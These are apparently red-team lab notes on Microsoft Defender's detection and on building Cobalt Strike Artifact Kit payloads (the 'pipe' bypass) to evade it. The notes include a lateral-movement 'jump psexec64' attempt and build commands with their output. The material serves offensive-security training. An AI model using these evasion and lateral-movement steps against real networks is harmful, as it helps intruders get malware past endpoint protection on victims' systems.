---
description: 10/04/2025
---

# Microsoft Defender Antivirus

## Introduction

Microsoft Defender is an antivirus product that comes pre-installed with Windows (both desktop and server editions).

In previous years, Defender was seen as a bit of a joke, but has since evolved into a rather formidable defence.

**There are three facets to its detection capability that we shall explore in this chapter:**

1. **On-disk**
2. **In-memory**
3. **Behavioral**

### How Payloads are Generated in Cobalt Strike

Before diving into Defender, it's useful to explain how payloads are generated in Cobalt Strike since there are only a few individual parts.

Beacon itself is written as a _**Reflective DLL**_ based on _**Steven Fewer's**_ [work](https://github.com/stephenfewer/ReflectiveDLLInjection).

**So, there's the:**

1. Core Beacon DLL (everything that make Beacon actually function)&#x20;
2. Plus a reflective loader component.

These are then converted into Position Independent Shellcode, which when injected and executed, calls the reflective loader entry point.

The reflective loader then loads the Beacon DLL into memory and kicks off a new thread to run it.

<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

Settings from **Malleable C2 profile**, such as the callback addresses are stomped into the DLL at the time your payloads are generated.

When you generate payloads artifacts such as the EXE's, DLL's, and PowerShell, this Beacon shellcode is generated, XOR'd and then stomped into them.

The artifacts themselves act as "simple" shellcode injectors.&#x20;

They all, with the exception of the service binary, inject Beacon shellcode into themselves.&#x20;

**That flow looks something like this:**

<figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

The service binary is identical except that it spawns another process and performs remote injection instead.

The complication when trying to bypass AV signatures is knowing which "part" of the payload they apply to - the core Beacon, the reflective loader, or the artifact.

## Artifact Kit

As we've all learned by now, dropping files to disk has a pretty bad rap.&#x20;

There are instances where it is pretty much unavoidable if we want to deploy certain tactics against our target(s).

For instance, we have access to the File Server, but we can't <mark style="color:yellow;">`PsExec`</mark> to it because the default binary payload is protect by Defender.

**Here's what happens if we try with Defender enabled:**

```
beacon> ls \\fs.dev.cyberbotic.io\c$

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     09/14/2022 15:44:51   $Recycle.Bin
          dir     08/10/2022 04:55:17   $WinREAgent
          dir     08/10/2022 05:05:53   Boot
          dir     08/18/2021 23:34:55   Documents and Settings
          dir     08/19/2021 06:24:49   EFI
          dir     05/08/2021 08:20:24   PerfLogs
          dir     09/14/2022 15:55:16   Program Files
          dir     08/10/2022 04:06:16   Program Files (x86)
          dir     09/14/2022 15:59:23   ProgramData
          dir     09/14/2022 15:25:23   Recovery
          dir     09/14/2022 15:25:04   System Volume Information
          dir     09/14/2022 15:26:47   Users
          dir     09/14/2022 15:25:15   Windows
 427kb    fil     08/10/2022 05:00:07   bootmgr
 1b       fil     05/08/2021 08:14:33   BOOTNXT
 12kb     fil     09/14/2022 16:00:25   DumpStack.log.tmp
 1gb      fil     09/14/2022 16:00:25   pagefile.sys

beacon> jump psexec64 fs.dev.cyberbotic.io smb
[-] Could not start service 633af16 on fs.dev.cyberbotic.io: 225
```

**We can view that message (`225`) by using:**

```
PS C:\Users\Attacker> net helpmsg 225

Operation did not complete successfully because the file contains a virus or potentially unwanted software.
```

and verify that Windows Defender indeed blocked the attempt.

**If we copy the payload to our local desktop and check the associated log, we can see that the "file" was detected:**

<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

These Cobalt Strike "artifacts" are nothing more than shellcode runners that inject Beacon shellcode when executed.&#x20;

As a _**rule of thumb**_, they inject the shellcode into themselves (e.g. using the `VirtualAlloc()` & `CreateThread()` pattern).

The service binary is the one exception, as it spawns a new process and injects the shellcode into that instead.

This is done so that when moving laterally with <mark style="color:yellow;">`PsExec`</mark>, the artifact can be deleted from disk immediately.

The Artifact Kit contains the source code for these artifacts and is designed to facilitate the development the development of sandbox-safe injectors. The idea is to develop artifacts that inject Beacon shellcode in a way that cannot be emulated by AV engines.

There are several bypass techniques provided with the kit which you can modify, or you can implement entirely new ones yourself.

Where the Artifact Kit does not help is making Beacon resilient to detection once it's running in memory (e.g. from memory scanners).

### Locating the kit and What it Consists of

The kit can be found in <mark style="color:yellow;">`C:\Tools\cobaltstrike\arsenal-kit\kits\artifact`</mark>.

Code for the entry point of each artifact format (i.e. EXE and DLL) can be found in `src-main`.

These include `dllmain.c` for artifacts, `main.c` for the EXE artifacts, and `svcmain.c` for the service EXE artifacts.

{% hint style="success" %}
These simply call a function called `start`, so you usually do not need to modify these files in most cases.

The implementation of this function can be found in each bypass file.
{% endhint %}

**These bypass files can be found in&#x20;**<mark style="color:yellow;">**`src-common`**</mark>**&#x20;and are named&#x20;**<mark style="color:yellow;">**`bypass-<technique>.c`**</mark>**.**

**The included ones are:**

* `mailslot` - reads the shellcode over a mailslot.
* `peek` - uses a combination of `Sleep`, `PeekMessage`, and `GetTickCount`.
* `pipe` - reads the shellcode over a named pipe.
* `readfile` - artifact reads itself from disk and seeks to find the embedded shellcode

### Modifying and Building Artifact Kits

Before we make any modifications to the kit, let's build one of the variants "as is".

The kit will include a build script which uses <mark style="color:yellow;">`mingw`</mark> to compile the artifacts.

**Running it without arguments will show the usage:**

```
ubuntu@DESKTOP-3BSK7NO /m/c/T/c/a/k/artifact> ./build.sh
[Artifact kit] [-] Usage:
[Artifact kit] [-] ./build <techniques> <allocator> <stage size> <rdll size> <include resource file> <stack spoof> <syscalls> <output directory>
[Artifact kit] [-]  - Techniques       - a space separated list
[Artifact kit] [-]  - Allocator        - set how to allocate memory for the reflective loader.
[Artifact kit] [-]                       Valid values [HeapAlloc VirtualAlloc MapViewOfFile]
[Artifact kit] [-]  - Stage Size       - integer used to set the space needed for the beacon stage.
[Artifact kit] [-]                       For a 0K   RDLL stage size should be 310272 or larger
[Artifact kit] [-]                       For a 5K   RDLL stage size should be 310272 or larger
[Artifact kit] [-]                       For a 100K RDLL stage size should be 444928 or larger
[Artifact kit] [-]  - RDLL Size        - integer used to specify the RDLL size. Valid values [0, 5, 100]
[Artifact kit] [-]  - Resource File    - true or false to include the resource file
[Artifact kit] [-]  - Stack Spoof      - true or false to use the stack spoofing technique
[Artifact kit] [-]  - Syscalls         - set the system call method
[Artifact kit] [-]                       Valid values [none embedded indirect indirect_randomized]
[Artifact kit] [-]  - Output Directory - Destination directory to save the output
[Artifact kit] [-] Example:
[Artifact kit] [-]   ./build.sh "peek pipe readfile" HeapAlloc 310272 5 true true indirect /tmp/dist/artifact
```

There is a `README.md` file inside the Artifact Kit directory for more information.

**Let's build a new set of artifact templates using the&#x20;**_<mark style="color:yellow;">**bypass-pipe**</mark>_**&#x20;technique:**

```
ubuntu@DESKTOP-3BSK7NO /m/c/T/c/a/k/artifact> ./build.sh pipe VirtualAlloc 310272 5 false false none /mnt/c/Tools/cobaltstrike/artifacts
[Artifact kit] [+] You have a x86_64 mingw--I will recompile the artifacts
[Artifact kit] [*] Using allocator: VirtualAlloc
[Artifact kit] [*] Using STAGE size: 310272
[Artifact kit] [*] Using RDLL size: 5K
[Artifact kit] [*] Using system call method: none
[Artifact kit] [+] Artifact Kit: Building artifacts for technique: pipe
[Artifact kit] [*] Recompile artifact32.dll with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact32.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact32svc.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact32big.dll with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact32big.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact32svcbig.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact64.x64.dll with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact64.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact64svc.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact64big.x64.dll with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact64big.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact64svcbig.exe with src-common/bypass-pipe.c
[Artifact kit] [+] The artifacts for the bypass technique 'pipe' are saved in '/mnt/c/Tools/cobaltstrike/artifacts/pipe'
```

**Each artifact flavour will be compiled to:** <mark style="color:yellow;">`/mnt/c/Tools/cobaltstrike/artifacts/pipe/`</mark> in my case, along with an aggressor script, `artifact.cna`:

```
ubuntu@DESKTOP-3BSK7NO /m/c/T/c/a/k/artifact> ls -l /mnt/c/Tools/cobaltstrike/artifacts/pipe/
total 2044
-rwxrwxrwx 1 ubuntu ubuntu  11914 Nov  6 14:56 artifact.cna*
-rwxrwxrwx 1 ubuntu ubuntu  14336 Nov  6 14:55 artifact32.dll*
-rwxrwxrwx 1 ubuntu ubuntu  14848 Nov  6 14:55 artifact32.exe*
-rwxrwxrwx 1 ubuntu ubuntu 323584 Nov  6 14:55 artifact32big.dll*
-rwxrwxrwx 1 ubuntu ubuntu 324096 Nov  6 14:55 artifact32big.exe*
-rwxrwxrwx 1 ubuntu ubuntu  15360 Nov  6 14:55 artifact32svc.exe*
-rwxrwxrwx 1 ubuntu ubuntu 324608 Nov  6 14:55 artifact32svcbig.exe*
-rwxrwxrwx 1 ubuntu ubuntu  19456 Nov  6 14:56 artifact64.exe*
-rwxrwxrwx 1 ubuntu ubuntu  18432 Nov  6 14:55 artifact64.x64.dll*
-rwxrwxrwx 1 ubuntu ubuntu 328704 Nov  6 14:56 artifact64big.exe*
-rwxrwxrwx 1 ubuntu ubuntu 327680 Nov  6 14:56 artifact64big.x64.dll*
-rwxrwxrwx 1 ubuntu ubuntu  20480 Nov  6 14:56 artifact64svc.exe*
-rwxrwxrwx 1 ubuntu ubuntu 329728 Nov  6 14:56 artifact64svcbig.exe*
```

**The naming convention of these files tell you what they are used for:**

* '<mark style="color:yellow;">32/64</mark>' denotes _**32 and 64bit architectures**_.
* '<mark style="color:yellow;">big</mark>' denotes that it's _<mark style="color:yellow;">**stageless**</mark>_.
* '<mark style="color:yellow;">svc</mark>' denotes that it's a service _<mark style="color:yellow;">**executable**</mark>_.

